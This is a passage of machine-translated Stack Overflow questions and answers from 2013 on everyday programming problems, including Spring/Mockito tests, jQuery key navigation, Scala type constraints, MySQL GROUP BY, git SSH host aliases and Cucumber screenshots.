                $('#refresh').fadeOut("fast");
                $('#refresh').load('index.php?_=' +Math.random()+' #refresh');
                $('#refresh').fadeIn("slow");
            }           
        }
    })
}, 1000); 
```

# java - StringTemplate 不替换不匹配的模式

> ID：16013073
> 
> 赞同：2
> 
> 时间：2013-04-15T10:36:34.117
> 
> 标签：java, template-engine, stringtemplate, stringtemplate-4

假设我有一个模板

```
"{man} likes to do {do}" 
```

我创建引擎

```
 ST engine = new ST(template, '{', '}'); 
```

`do`模型中设置为`sports`和否的结果`man`是：

```
"likes to do sports" 
```

但我希望它保持未解决，即

```
"{man} likes to do sports" 
```

这可以在 StringTemplate 4 中完成吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:09:09.237

您可以使用`if-else`模板文件中的构造来检查是否提供了模板的参数。

示例：`{if (man)}{man}{else}\{man\}{endif}`，我不确定这是否是转义分隔符的正确方法。

# spring - 纠缠弹簧上下文中的单元测试

> ID：16013077
> 
> 赞同：2
> 
> 时间：2013-04-15T10:36:36.507
> 
> 标签：spring, junit, mockito, springmockito

给定一个遗留应用程序有 1500 个 spring.xmls。我想为服务编写单元测试。我深陷依赖地狱。我必须按原样接受该应用程序，没有出路。

所以我们使用 spring-3.something 和 mockito-1.9，我想要测试服务的好方法。较新的代码大量使用@Autowired 注解。

间接地，该服务使用了我实际想要在测试中使用的 ~25 个助手（工厂方法等），以及 ~25 个我对此测试不感兴趣的对象。

我目前尝试以上述方式设置上下文，但我对@Mock、@InjectMocks、@Autowired 的影响感到困惑。

我的测试如下。我需要帮助才能正确设置。

**问题：**

*   **@InjectMocks 的实际效果是什么？**
*   **我如何才能决定（技术上）真正使用哪些自动装配的 bean，哪些被模拟替换？**
*   **我知道，我在滥用模拟来获取假货。有没有一种更简单的方法可以在单线中获取假货？**
*   **请注意，我想了解这一点，因为我有大量此类服务... **

这是我的示例：

```
@ContextConfiguration(locations = {
    "classpath:/some/path/MainTestConfig.spring.xml"
})
@RunWith(SpringJUnit4ClassRunner.class)
public class SampleTest {

    // ***            Uninteresting Dependencies to be mocked        *** //
    @Mock Mock1 mock1;
    @Mock Mock2 mock2;

    /** Service under test */
    @Autowired
    SomeService service;

    // ***            Tightly coupled helpers to be used              *** //
    @Autowired Helper1 helper1
    @Autowired Helper2 helpr2

    @Before
    public void setup() {
        MockitoAnnotations.initMocks(SampleTest.class);
    }

    @Test
    public void testSample() {

        // prepare dummy context
        SomeContext context = new Context();

        // define expected result
        int expectedValue = 42;

        //execute method under test, record result
        Result actualResult = service.execute(context);

        //make assertions on result
        assertTrue(actualResult.getSomething()==expectedValue);
    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T14:52:45.133

我想将此作为单独的答案发布，因为这应该更好地解决您关于@Mock、@Autowired 和@InjectMocks 的实际问题。

`@Mock`: 这标记了一个在被调用时应该被创建为模拟（使用`mock(MyClass.class)`）的字段`MockitoAnnotations.initMocks(this)`。

`@Autowired`: 用实现类/接口的 bean 标记应该由 Spring 分配的字段。

`@InjectMocks`：标记在调用时应由 Mockito 创建的字段`MockitoAnnoations.initMocks(this)`。它创建该类的一个实例并将带`@Mock`注释的字段注入到该实例中。（请参阅评论中对此声明的更正）。

分析：

`@InjectMocks`与 Spring 上下文不兼容，并且`@Autowired`因为`InjectMock`创建了类的新实例，所以它不使用 Spring 实例。

要做你正在寻找的东西，你需要使用[Springockito](https://bitbucket.org/kubek2k/springockito/wiki/Home)。（延迟更新）Springockito 将允许您将模拟注入到您的 Spring 上下文中，从而将这些模拟用作`Autowired`候选对象。它允许模拟和间谍。在您的测试中使用`ReplaceWithMock`和`Autowired`在同一字段上是一般做法（如 wiki 上的示例所示）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T12:19:11.260

第一个问题，你需要加载弹簧上下文做这个测试吗？通常，当我有 Spring 项目时，每个类都有一个不加载上下文文件的 UNIT 测试。我将有一个不同的 CONTEXT 测试来加载上下文文件并验证它是否正确加载。如果您正在进行真正的单元测试，我建议您不要加载上下文。如果被测类`@Autowired`用于分配依赖项（因此没有设置器），则使用 Spring`ReflectionTestUtils`分配这些字段。

# javascript - 无法使用箭头键在文本框之间移动

> ID：16013081
> 
> 赞同：0
> 
> 时间：2013-04-15T10:36:51.277
> 
> 标签：javascript, jquery

我的javascript有点问题，希望你能帮忙。

我在这里使用一个示例：[http](http://www.knowlbase.in/2012/01/traverse-cursor-through-text-box-with.html) : //www.knowlbase.in/2012/01/traverse-cursor-through-text-box-with.html 在页面上的文本框之间移动。Left 和 Right 效果很好，但上下移动光标对角线向右移动（但是当按下向上键时它确实对角线向上移动，当按下向下键时它对角线向下移动）。

谁能看到我哪里出错了？

编辑 - 添加[jsFiddle](http://jsfiddle.net/LYU76/)

这就是我所拥有的：

```
function arrowKeyPressed() {
$('input').keyup(function (e) {
    if (e.which == 39)
        $(this).closest('td').next().find('input').focus();
    else if (e.which == 37)
        $(this).closest('td').prev().find('input').focus();
    else if (e.which == 40)
        $(this).closest('tr').next().find('td:eq(' + $(this).closest('td').index() + ')').find('input').focus();
    else if (e.which == 38)
        $(this).closest('tr').prev().find('td:eq(' + $(this).closest('td').index() + ')').find('input').focus();
});
}; 
```

这就是我添加文本框属性的方式（所有文本框都是以编程方式创建的）：

```
tb.Attributes.Add("onkeyup", "arrowKeyPressed()"); 
```

这是生成的 HTML 的样子（这只是一个文本框；所有其他文本框都是相同的，除了选项卡索引）：

```
<input name="ctl00$MainContent$addPrices$Textbox101"
type="text"id="ctl00_MainContent_addPrices_Textbox101" tabindex="13" 
onblur="validateText('ctl00_MainContent_addPrices_Textbox101', 
'ctl00_MainContent_addPrices_AddQuote', 'ctl00_MainContent_addPrices_msgLbl')" 
style="width:60px;"> 
```

有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:47:37.257

使用`jQuery`. 我的意思是，在`$(document).ready(function(){});`

```
$(document).ready(function () {
    $('input').keyup(function (e) {
        if (e.which == 39)
            $(this).closest('td').next().find('input').focus();
        else if (e.which == 37)
            $(this).closest('td').prev().find('input').focus();
        else if (e.which == 40)
            $(this).closest('tr').next().find('td:eq(' + $(this).closest('td').index() + ')').find('input').focus();
        else if (e.which == 38)
            $(this).closest('tr').prev().find('td:eq(' + $(this).closest('td').index() + ')').find('input').focus();
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-16T11:45:10.233

您的无效 HTML 是这里的问题。`<th />`只允许在一个`<thead />`元素中。因此，如果您用它替换`<th />`第一列的标签，`<td />`它就可以正常工作。

```
<tr>
    <td>2013 04 Apr</td>
    <td>
        <input style="width:60px;">
    </td>
    <td>
        <input style="width:60px;">
    </td>
    <td>
        <input style="width:60px;">
    </td>
    <td>
        <input style="width:60px;">
    </td>
    <td>
        <input style="width:60px;">
    </td>
    <td></td>
</tr>
<!-- ... --> 
```

[更新的小提琴](http://jsfiddle.net/arJZc/1/)

**编辑**
“错误”行为的原因是，`<th />`但为了完整起见，我将详细说明**原因**。

```
$(this).closest('td').index() 
```

这确定了`<td />`行中的索引（包括`<th />`）。此索引用于构建仅查找`<td />`元素的选择器。

```
'td:eq(' + $(this).closest('td').index() + ')' 
```

因此，您“缺少”了第一列 ( `<th />`)。

# scala - 关于 joinLeft of Either 的类型约束和具体化

> ID：16013084
> 
> 赞同：0
> 
> 时间：2013-04-15T10:37:02.763
> 
> 标签：scala, reification

`joinLeft`定义为：

```
abstract class Either[+A, +B]

def joinLeft[A1 >: A, B1 >: B, C](implicit ev: A1 <:< Either[C, B1]):
    Either[C, B1] = this match {
    case Left(a)  => a
    case Right(b) => Right(b)
} 
```

*   有了已知的`A`and `B`，我们需要一个`implicit ev: A1 <:< Either[C, B1]`that
    1.  满足约束`A1 >: A, B1 >: B`。
    2.  物化`A1 <: Either[C, B1]`

*   为此，我们需要隐式 `conforms[A1]`和`conforms[Either[C, B1]]`

如果直到现在我仍然是正确的，那么在我看来，`A1`只要`B1`它们超出下限`A`和`B`. 所以我想知道 scala 如何给我们`A1`和`Either[C, B1]`（以及它们是什么），以便我们隐含`conforms`以促进`<:<`完成断言的工作`A1 <: Either[C, B1]`。

**PS**
我认为这个问题与我的另一个问题有点相关“ [joinLeft [A1 >: A, B1 >: B, C]... 为什么类型约束 A1 >: A and B1>: B 是必要的？](https://stackoverflow.com/questions/15975976/joinleft-a1-a-b1-b-c-why-are-type-constraint-a1-a-and-b1-b-nec) ”。如果有人也可以看看它，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:52:56.727

你是对的，有很多选择。一般来说，泛型方法的类型推断使用参数来确定泛型参数的值

```
def myMethod[A](aList:List[A]) 
```

但是，这不是使用泛型参数类型推断的唯一方法。值得注意的是，类型参数可以是：

*   明确的
*   使用预期结果类型确定

在这种情况下，由于无法从参数中确定泛型类型参数（因为没有显式参数），您通常将方法的结果分配给类型化变量，或者在显式返回的方法末尾使用它类型。

你可能会问自己 A1 将如何解决，这是一个非常有趣的问题。实际上 A1 不存在于输入类型中，也不存在于输出类型中。它有什么用？

答案在以下定义中，来自`Predef.scala`

```
@implicitNotFound(msg = "Cannot prove that ${From} <:< ${To}.")
  sealed abstract class <:<[-From, +To] extends (From => To) with Serializable 
```

因为在方法中`<:<`是逆变的`From`

```
def joinLeft[B1 >: B, C](implicit ev: A <:< Either[C, B1]):
    Either[C, B1] = this match {
    case Left(a)  => a
    case Right(b) => Right(b)
} 
```

将无法正确处理 A 上的子类化。这就是为什么您需要一个额外的泛型类型参数 A1 的原因，Scala 编译器通过使用 A1 来解决这个问题，该 A1 赋予隐式最高优先级。

# oracle - PLSQL 触发器通过 SQL 加载器触发

> ID：16013087
> 
> 赞同：0
> 
> 时间：2013-04-15T10:37:08.727
> 
> 标签：oracle, plsql, triggers

当我们通过 SQL 加载器插入时，表是否被触发？请详细解释

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T14:14:11.373

`INSERT`如果使用常规加载，Oracle 将执行触发器，[但当您使用直接加载](http://docs.oracle.com/cd/E11882_01/server.112/e22490/ldr_modes.htm#i1008078)（使用选项`DIRECT=true`）时不会：

> 使用传统的路径加载方法，使用标准 SQL INSERT 语句插入行数组 — 自动应用完整性约束和插入触发器。但是**当您使用直接路径加载数据时，SQL*Loader 会禁用一些完整性约束和所有数据库触发器**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T14:15:07.783

如果您执行常规加载或外部表加载，触发器将触发并检查任何活动约束。

如果您执行直接路径加载，则会绕过触发器和约束检查。

[您可以在SQL Loader 文档](http://docs.oracle.com/cd/B19306_01/server.102/b14215/ldr_concepts.htm)中阅读更多内容（指向 Oracle 10g 文档的链接）。

# mysql - 真正的 MySQL 语句

> ID：16013094
> 
> 赞同：-1
> 
> 时间：2013-04-15T10:37:31.157
> 
> 标签：mysql, sql

我有一个表（基础），表结构是：

```
id, name, money, manager, date 
```

我会从表中检索不同的值

```
SELECT DISTINCT name from base; 
```

这段代码有效，但我需要这样的东西

```
SELECT DISTINCT name SUM(money) from base; 
```

此代码仅从表中检索一个值（名称）和所有货币值的总和：

像这样

```
id      name      money    manager      date
===     =====     =====    =======   ===========
 1      John       3000     Scot      10.04.2013 
```

我需要名字 DISTINCT 和钱 SUM

```
 id      name      money    manager      date
   ===     =====     =====    =======   ===========
    1      John       150     Scot      10.04.2013
    2      Mia        200     Scot      11.04.2013
    3      Monica     650     Scot      09.04.2013
   ...     ......     ...     ....      .......... 
```

如果我像这样添加 SQL 查询：

```
SELECT DISTINCT name, SUM(money) FROM base WHERE name='Mia' 
```

或者

```
SELECT name, SUM(money) FROM base WHERE name='Mia' 
```

代码有效。如何对表中的所有记录执行此操作？

我在用着：

Mysql 5.5.24, Delphi Xe3, Delphi sql 组件 Unidac

对不起，我的英语不好

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T10:40:59.577

`GROUP BY`将允许您使用组函数，如`SUM`、或 ：`AVG``MIN``MAX`

```
SELECT name, SUM(money) FROM base GROUP BY name; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T10:42:26.667

我不确定你想得到什么，我想这是所有名字为 Mia 的唱片的总和。

```
SELECT (SELECT SUM(money) FROM base WHERE name='Mia') as money, DISTINCT name FROM base WHERE name='Mia' 
```

为米娅

和普遍使用

```
SELECT (SELECT SUM(money) FROM base b1 WHERE b1.id=b2.id) as money, DISTINCT name FROM base b2 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:54:30.390

正如@Klas Lindbäck 所说，您可以使用`group by`它来计算每个名称的总和。如果您只需要给定名称的总和（比如说`Mia`），您还可以使用以下查询：

```
 SELECT 'Mia' as name, SUM(money) from base where name = 'Mia'; 
```

# java - 更改 jtree 节点文本运行时

> ID：16013097
> 
> 赞同：4
> 
> 时间：2013-04-15T10:37:40.013
> 
> 标签：java, swing, jtree

我正在尝试在 java swing 中创建一个 JTree 现在我想在运行时更改节点文本

```
try
 {

int a=1,b=2,c=3;
 DefaultMutableTreeNode root =
new DefaultMutableTreeNode("A"+a);
DefaultMutableTreeNode child[]=new DefaultMutableTreeNode[1];
DefaultMutableTreeNode grandChild[]= new DefaultMutableTreeNode[1];

child[0] = new DefaultMutableTreeNode("Central Excise"+b);
  grandChild[0]=new DefaultMutableTreeNode("CE Acts: "+c);
child[0].add(grandChild[0]);
 root.add(child[0]);
tree = new JTree(root);
 }
 catch(Exception ex)

 {
  ex.printStackTrace()
 } 
```

现在我想稍后我如何在子节点和大子节点中动态地将 A 1 更改为 2

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-15T11:15:19.113

你正在寻找[`javax.swing.tree.DefaultMutableTreeNode.setUserObject(Object)`](http://docs.oracle.com/javase/7/docs/api/javax/swing/tree/DefaultMutableTreeNode.html#setUserObject%28java.lang.Object%29)

```
DefaultTreeModel model = (DefaultTreeModel) tree.getModel();
DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getRoot();
root.setUserObject("My label");
model.nodeChanged(root); 
```

这假设您正在使用`DefautltTreeModel`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:09:56.623

如果您不使用自定义 TreeModel，则树的模型是[DefaultTreeModel](http://docs.oracle.com/javase/6/docs/api/javax/swing/tree/DefaultTreeModel.html)。

给定 *DefaultMutableTreeNode* ***getUserObject()***（字符串或其他）来实现您想要的，您需要使用*某种比较器*来遍历树。

 **根据您的问题和粘贴的代码，您有 2 个*简单的选项：*

*   如果您的更改是由点击事件触发的，您可以获得选择并从那里遍历树。
*   否则你需要从根部走树

成功更改后，您需要从模型中触发事件，这些事件将在稍后触发视图的重绘（*nodeWereInserted*等）。

希望能帮助到你**

# git - 无法克隆 git 存储库，必须先在本地创建存储库并配置其本地远程设置

> ID：16013098
> 
> 赞同：0
> 
> 时间：2013-04-15T10:37:47.373
> 
> 标签：git, permission-denied, git-clone, git-remote

我的`~/.ssh`包含两个密钥对：

*   `id_rsa_foo`&`id_rsa_foo.pub`
    *   `foousername`对于GitHub 上的用户( `github.com`)
*   `id_rsa_bar`&`id_rsa_bar.pub`
    *   `barusername`对于GitHub 上的用户( `github.com`)
    *   对于`barusername`我服务器上的用户 ( `indefero.myserver.com`)

“`~/.ssh/config`知道”密钥文件：

```
#github.com-foousername account
Host github.com-foousername
    HostName github.com
    User git
    IdentityFile ~/.ssh/id_rsa_foo

#github.com-barusername account
Host github.com-barusername
    HostName github.com
    User git
    IdentityFile ~/.ssh/id_rsa_bar

#indefero.myserver.com-foousername account
Host indefero.myserver.com-foousername
    HostName indefero.myserver.com
    User foousername
    IdentityFile ~/.ssh/id_rsa_bar 
```

“`~/.ssh/known_hosts`知道”服务器：

```
github.com,207.97.227.239 ssh-rsa AAAAB3N...AaQ==
204.232.175.90 ssh-rsa AAAAB3N...AaQ==
indefero.myserver.com,111.222.333.444 ssh-rsa AAAAB3N...Ytw== 
```

现在，当我尝试从 GitHub 克隆时，会出现错误：`Permission denied (publickey). fatal: The remote end hung up unexpectedly`

```
user@machine ~/Desktop/test
$ git clone git@github.com:foousername/project1.git
Cloning into 'foousername'...
Permission denied (publickey).
fatal: The remote end hung up unexpectedly 
```

但是当我首先在我的本地机器上创建一个存储库并设置本地/项目`config`时：

```
[remote "origin"]
    fetch = +refs/heads/*:refs/remotes/origin/*
    url = git@github.com-foousername:foousername/project1.git 
```

我可以`pull`/ `push`。（这种方式适用于 GitHub 存储库，myserver ropos 甚至不需要密码：`indefero@indefero.it-and-t.com's password:`。但可能是另一个问题。）

为了克隆 repos，我该如何改变这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:11:35.070

您已`~/.ssh/config`正确设置，但您没有在`git clone`命令中使用正确的主机。使用您在配置文件中设置的主机名来使用相应的密钥：

```
# Use your default key
git clone git@github.com:foousername/project1.git

# Use the ~/.ssh/id_rsa_foo key
git clone git@github.com-foousername:foousername/project1.git

# Use the ~/.ssh/id_rsa_bar key
git clone git@github.com-barusername:barusername/project1.git 
```

# objective-c - NSWindow 的顶部位置在调整大小时跳跃（自动布局）

> ID：16013101
> 
> 赞同：2
> 
> 时间：2013-04-15T10:37:52.900
> 
> 标签：objective-c, cocoa, nswindow, autolayout

我确实在我的新项目中大量使用了自动布局，但是在调整大小时我遇到了一个与 NSWindow 相关的问题......

*   `NSWindow`是无边框窗口，
*   在初始设置期间，此窗口的框架是根据状态项位置和初始内容视图大小（`intrinsicContentSize`的`contentView`）设置的，
*   垂直锚属性设置为`NSLayoutAttributeTop`,
*   水平锚属性设置为`NSLayoutAttributeCenterX`

... 到目前为止，一切都很好。`NSWindow`放置正确，尺寸正确，一切看起来都很好。

每当`contentView`由于自动布局等原因自动调整大小时。最终窗口位置正确，大小正确，...，再次如此，到目前为止一切都很好。

有什么问题？当动画正在进行时（窗口垂直调整大小），我的窗口顶部向下/向上/向下/向上/向下/向上/向下/向上/... 1 个像素跳跃，直到动画完成。长得很丑。。。

它的行为就像这个伪代码......

```
NSRect frameRect = window.frame;
while ( frameRect.size.height != desiredHeight ) {
  frame.origin.y -= 1; // Move window down by 1px
  [self setFrame:frame display:YES animate:YES];
  frame.size.height += 1; // Increase window height
  [self setFrame:frame display:YES animated:YES];
} 
```

...看起来自动布局改变了窗口的原点，然后自动布局意识到高度也应该改变，......

有人看到这种行为吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T13:36:02.200

Mea culpa，我怎么能错过它，这是因为我确实使用`NSLayoutConstraint`了`height`我的一个观点，我正在通过它制作动画`animator`，它会产生非整数值 - 所以`height`有时确实包含实数，这就是跳到顶部的原因`NSWindow`. 问题解决了。

# ruby - Watir-webdriver：为所有失败的场景获取相同的屏幕截图

> ID：16013103
> 
> 赞同：3
> 
> 时间：2013-04-15T10:37:54.743
> 
> 标签：ruby, cucumber, screenshot, watir-webdriver

我已经设置了在场景失败时拍摄的屏幕截图，但是我的 html 报告在所有失败的场景中都显示了相同的屏幕截图。任何人都可以帮助并让我知道如何为每个失败的场景拍摄独特的屏幕截图。

这是我的 env.rb 中的代码：

```
After do |scenario|
  if scenario.failed?
     @browser.driver.save_screenshot("screenshot.png")
     embed("screenshot.png", "image/png")
  end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T12:54:14.123

您每次都将屏幕截图保存到同一个文件中（即每次都覆盖之前的屏幕截图）。该报告还将所有图像链接到同一个地方。这就是为什么你在任何地方都能得到相同的图像。

您需要为屏幕截图提供一个唯一的名称。

例如，您可以为图像添加时间戳（带有日期和时间）：

```
After do |scenario|
  if scenario.failed?
     screenshot_file = "screenshot-#{Time.now.strftime('%Y%m%d-%H%M%S')}.png"
     @browser.driver.save_screenshot(screenshot_file)
     embed(screenshot_file, "image/png")
  end   
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T17:08:39.950

贾斯汀有答案，但是虽然时间戳很好，但在查看文件时很难知道哪个文件适用于什么场景。当我在创建和调试时运行测试时，我什至不看 html 报告，我只看生成的屏幕截图，所以在这种情况下，拥有更多逻辑名称会加倍有用。

所以我使用的代码看起来像这样，并使用场景名称嵌入

```
After do |scenario|
  if scenario.failed?
    screenshot = "./FAILED_#{scenario.name.gsub(' ','_').gsub(/[^0-9A-Za-z_]/, '')}.png"
    @browser.driver.save_screenshot(screenshot)
    encoded_img = @browser.driver.screenshot_as(:base64)
    embed("data:image/png;base64,#{encoded_img}",'image/png')
  end
end 
```

[在这篇“二四一”博客文章](http://twofourone.blogspot.com/2011/04/making-your-cukes-more-awesomer-with.html)中描述了一种更强大的方法，处理场景大纲和附加时间戳 ，到目前为止，我不需要走那么远，但我可能会从中提取一些东西来处理场景大纲。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-22T01:16:10.637

[对于那些使用 RSpec 的人，在watir-rspec](https://github.com/watir/watir-rspec)项目中有一个非常好的 HtmlFormatter 实现

# .htaccess - .htaccess 用于无重定向

> ID：16013105
> 
> 赞同：-1
> 
> 时间：2013-04-15T10:38:01.720
> 
> 标签：.htaccess

通过访问 URL [http://DOMAIN.COM/rss.php](http://DOMAIN.COM/rss.php)它应该加载[http://DOMAIN.COM/feeds.xml](http://DOMAIN.COM/feeds.xml) **而没有重定向**。如果有人知道如何实现这一点，请帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:55:55.660

> 通过访问 URL ，它应该在没有重定向的情况下`http://DOMAIN.COM/rss.php`加载
> `http://DOMAIN.COM/feeds.xml`

您可以在根目录的一个 .htaccess 文件中尝试此操作：

```
Options +FollowSymlinks -MultiViews
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_URI}  !feeds\.xml   [NC]
RewriteRule ^rss\.php/?$    /feeds.xml    [L,NC] 
```

# database - 是否可以使用 Google 脚本创建公共数据库（电子表格）搜索？

> ID：16013110
> 
> 赞同：2
> 
> 时间：2013-04-15T10:38:21.483
> 
> 标签：database, search, google-apps-script, google-sheets

我正在尝试创建一个网站，用户可以在其中查找一组资源，例如门户网站或 JSTOR 等数据库。我正在使用 Weebly；这个网站最终会被交给不太懂电脑的人，所以我试图让事情变得简单*（并且免费，在可行的情况下）*。

我的想法是使用 Google 电子表格/表格来处理每个单独资源*（标题、作者、类型、主题、国家等）*的数据的输入和存储，然后找到一些创建搜索功能的方法，可以放置在网站上。任何用户都可以到达该站点，输入他们想要查找的任何标准，并且将列出数据库中的任何资源以供用户进一步调查。用户不会向电子表格添加数据；只查询它的数据。

我的第一个问题是这样的脚本/安排是可能的，它可以嵌入到网站页面中吗？我的第二个问题是最好的方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T20:18:22.823

是的，这当然是可能的，但可以通过多种方式实现。

您可以采用的一种方法是将电子表格中的所有数据以 JSON 格式检索，并将其作为 HTML 表添加到 DOM。然后你可以使用一个不错的插件，比如[dataTables](http://www.datatables.net/)，它有一个很好的原生搜索功能。我将在下面给出一个基本示例。

要检索数据，您可以使用[Google 的电子表格 JSON API](https://developers.google.com/gdata/samples/spreadsheet_sample)。下面是一个基本示例。

```
<script src="http://spreadsheets.google.com/feeds/cells/*ID*/*WS*/public/values?alt=json-in-script&amp;callback=*FN*"></script> 
```

*   其中*ID*是电子表格的长 ID。
*   其中*WS*是工作表编号，例如 1、2、3 等。
*   其中*FN*是您要调用的函数。在我下面的函数中，我使用 importGSS

然后我编写了以下脚本，将数据添加到 HTML 表中。它首先将第一行添加到一个`<thead>`部分，然后将其余部分添加到该`<tbody>`部分。

```
function cellEntries(json, dest) {
    var table = document.createElement('table');
    var thead = document.createElement('thead');
    var tbody = document.createElement('tbody');
    var thr;
    var tr;
    var entries = json.feed.entry;
    var cols = json.feed.gs$colCount.$t;

    for (var i=0; i <cols; i++) {
        var entry = json.feed.entry[i];
        if (entry.gs$cell.col == '1') {
            if (thr != null) {
                tbody.appendChild(thr);
            }
            thr = document.createElement('tr');
        }
        var th = document.createElement('th');
        th.appendChild(document.createTextNode(entry.content.$t));
        thr.appendChild(th);
    } 
    for (var i=cols; i < json.feed.entry.length; i++) {
        var entry = json.feed.entry[i];
        if (entry.gs$cell.col == '1') {
            if (tr != null) {
                tbody.appendChild(tr);
            }
            tr = document.createElement('tr');
        }
        var td = document.createElement('td');
        td.appendChild(document.createTextNode(entry.content.$t));
        tr.appendChild(td);
    } 
    $(thead).append(thr);
    $(tbody).append(tr);
    $(table).append(thead);
    $(table).append(tbody);
    $(dest).append(table);
    $(dest + ' table').dataTable();
} 
```

然后，您可以使用 ... 回调函数，`#Destination`您`<div>`要将 HTML 表添加到哪里。

```
function importGSS(json){
   cellEntries(json, '#Destination');
}; 
```

全部完成后，您将看到类似于以下屏幕截图的内容，顶部是最终结果，底部是原始电子表格。我已经编辑了一些信息。我希望这对您有所帮助。

![在此处输入图像描述](https://i.stack.imgur.com/od9zu.png)

# html - 将 HTML 输入数据保存为 XML

> ID：16013111
> 
> 赞同：0
> 
> 时间：2013-04-15T10:38:22.620
> 
> 标签：html, xml, input, save

我搜索了论坛，找不到关于我的麻烦的具体答案。

我想做的是有一个简单的表单，用户可以在其中输入信息，然后在按下按钮时将其保存在服务器上。如果可能的话，可以使用第一个字段中指定的名称保存 XML 文档。

我需要在一个用动作脚本编写的应用程序中提取信息。遗憾的是，这是我唯一正确掌握的语言。

我正在尝试从这个表格中获取我的信息（它应该更大，但现在，我只需要一个工作示例）：

```
<form action="" method="post" class="form">

Name: <input type="text" id="name" name="name">
<br>    
Activity: <input type="text" id="activity1" name="activity1">
<br>
Activity: <input type="text" id="activity2" name="activity2">

<input type="submit" id="btnSub" name="btnSub" value="Save">
</form> 
```

保存在 XML 文档中。

如前所述，一切都将在服务器上。如果它有任何帮助。我不能使用 ASP，因为 one.com 不支持这一点。：/

希望你们中的一些人能够并且愿意帮助我。

我会尽力回答所有不清楚的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:27:57.623

这可能会有所帮助：

[http://www.hardcode.nl/subcategory_1/article_431-xml-to-string-and-string-to-xml-in-javascript](http://www.hardcode.nl/subcategory_1/article_431-xml-to-string-and-string-to-xml-in-javascript)

然后，您可以在 jQuery 中使用 AJAX 调用将数据发送到 PHP 以保存它，如果这是您需要的。

编辑：但是，我确实觉得在服务器端完成这项工作要容易得多。我对 PHP 不是很好，但它在 .NET 中非常简单（不幸的是，你解释说你不能使用这个选项）。

# c# - HtmlTextWriter - 包含空格的文件路径

> ID：16013112
> 
> 赞同：1
> 
> 时间：2013-04-15T10:38:24.297
> 
> 标签：c#, winforms, htmltextwriter

我正在尝试使用 HtmlTextWriter 创建一个 html 页面，该页面一切正常，直到我尝试将图像创建到文件路径中包含空格的文件夹中

```
C:\Documents and Settings.... 
```

似乎正在发生的是

```
m_htmlWriter.AddAttribute(HtmlTextWriterAttribute.Src, imageName); 
```

正在将空格转换为**%20**，因此，源的文件路径变得无效，并导致我的网络浏览器和安装的互联网浏览器无法显示所述图像，而是显示损坏的图像图标/图像..

我尝试了多种不同的方法来使其正常工作，包括

`Uri.UnescapeDataString`, 包括`@`imageName 前面的符号

我还发现，如果我从页面源复制链接（`C:\Documents%20and%20Settings\...`然后 windows 无法找到该文件（预期这个）

由于我受到限制，我无法使用 HtmlAgilityPack.. 有人有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-03T00:00:51.407

只需添加一个布尔参数来告诉 HtmlTextWriter 类您不想对其进行编码：-

```
m_htmlWriter.AddAttribute(HtmlTextWriterAttribute.Src, imageName, false); 
```

有两种类似的方法可用：

```
AddAttribute(HtmlTextWriterAttribute, String)
AddAttribute(HtmlTextWriterAttribute, String, Boolean) 
```

使用第二个应该可以解决问题。

# mysql-connector - MySQL C 连接器：从单独的线程执行查询

> ID：16013116
> 
> 赞同：0
> 
> 时间：2013-04-15T10:38:39.550
> 
> 标签：mysql-connector, mariadb, mysql

我在应用程序的主线程中创建与服务器的连接：

```
ClassA::ClassA(void)
{
    mpMySQL = mysql_init(NULL);

    if (!mysql_thread_safe())
    {
        // Error;
    }
} 
```

稍后与服务器建立连接：

```
void ClassA::OpenConnection(/*inParams*/)
{
    .....
    mysql_real_connect(mpMySQL, /*inParams*/);
    .....
} 
```

现在我使用 mpMySQL 来执行查询：

```
MyRes ClassA::SQLQuery(MyString inQuery)
{
   ...
    if (!mysql_real_query(mpMySQL, inQuery, inQuery.length()))
    {
    ...
    }
} 
```

虽然应用程序在主线程中使用 ClassA 的对象 - 一切正常。

但是如果方法

```
A->SQLQuery() 
```

从线程调用 - 应用程序在执行时崩溃

```
mysql_real_query() 
```

======

据我了解，这是因为 mpMySQL 在一个线程中初始化并在另一个线程中使用。我对吗？

有办法做到这一点吗？或者我应该在每个单独的线程（并建立单独的连接）中初始化 MYSQL 结构以执行查询？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:41:33.390

[mysql_thread_init()](http://dev.mysql.com/doc/refman/5.5/en/mysql-thread-init.html)是诀窍。您需要为使用 C API 的每个线程执行它。mysql_init() 隐式执行它。

# php - PHP - 将类添加到循环中的锚点

> ID：16013118
> 
> 赞同：0
> 
> 时间：2013-04-15T10:38:44.333
> 
> 标签：php, html, image, wordpress, anchor

我需要在此页面上的每个锚点上添加一个“project-img”类：http: [//petekingston.com/portfolio/test/](http://petekingston.com/portfolio/test/)

我的这个 atm 的代码（PHP 循环）是：

```
<div id="container">
<?php foreach (simple_portfolio_media() as $media_item): ?>
    <div class="box lightGrey masonry masonry-brick">
        <?php   
            $class = ('') ? 'class="project-img"' : '';
            switch ($media_item['type']):
                case 'image':
